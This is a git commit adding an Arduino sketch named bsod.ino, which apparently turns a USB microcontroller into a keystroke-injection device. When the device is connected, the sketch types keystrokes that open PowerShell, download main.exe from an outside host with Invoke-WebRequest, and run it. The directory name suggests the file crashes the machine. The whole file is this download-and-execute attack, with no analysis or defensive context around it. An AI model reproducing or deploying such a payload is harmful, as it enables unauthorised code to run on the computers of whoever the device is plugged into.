20806855d5b3a4107c97837f290772b1cc2eca36
Laurence Luo <admin@lzc.app>
2022-05-27 23:01:31 +0800

    Initial commit

---
+++ bsod/bsod.ino
@@ -0,0 +1,26 @@
+#include <Keyboard.h>
+
+void setup() {
+  delay(500);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.println("powershell");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.println("invoke-webrequest -uri https://www.lzc.app/main.exe -outfile main.exe");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.println(".\\main.exe");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(500);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
